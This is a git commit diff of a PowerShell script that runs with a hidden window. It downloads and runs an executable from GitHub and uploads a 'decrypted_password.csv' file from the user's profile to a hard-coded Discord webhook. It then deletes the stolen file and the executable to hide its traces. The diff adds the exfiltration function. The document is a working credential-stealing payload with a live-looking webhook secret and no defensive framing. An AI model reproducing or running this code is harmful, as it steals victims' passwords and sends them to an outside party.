8a336968efbd5de5b487a3917e26b6adeacba399
skekic16 <151707511+skekic16@users.noreply.github.com>
2024-01-01 22:57:33 -0600

    Update DP.ps1

--- DP.ps1
+++ DP.ps1
@@ -1,3 +1,28 @@
 powershell -WindowStyle Hidden iwr https://github.com/skekic16/lol/raw/main/d.exe?dl=1 -O $Env:USERPROFILE\d.exe
-start sleep 5
 Start-process "$env:USERPROFILE\d.exe"
+start sleep 5
+function Upload-Discord {
+
+[CmdletBinding()]
+param (
+    [parameter(Position=0,Mandatory=$False)]
+    [string]$file,
+    [parameter(Position=1,Mandatory=$False)]
+    [string]$text 
+)
+
+$hookurl = 'https://discord.com/api/webhooks/1184838069740896326/B30LAh5X9NkQ111endVELXK2MBQRblzduqnE2tcSjRhPXn3dEnLCrUp-5hjj6mVGIYEk'
+
+$Body = @{
+  'username' = $env:username
+  'content' = $text
+}
+
+if (-not ([string]::IsNullOrEmpty($text))){
+Invoke-RestMethod -ContentType 'Application/Json' -Uri $hookurl  -Method Post -Body ($Body | ConvertTo-Json)};
+
+if (-not ([string]::IsNullOrEmpty($file))){curl.exe -F "file1=@$file" $hookurl}
+}
+Upload-Discord -file $env:USERPROFILE\decrypted_password.csv
+rm "$env:USERPROFILE\decrypted_password.csv" -r -Force -ErrorAction SilentlyContinue
+rm "$env:USERPROFILE\d.exe" -r -Force -ErrorAction SilentlyContinue
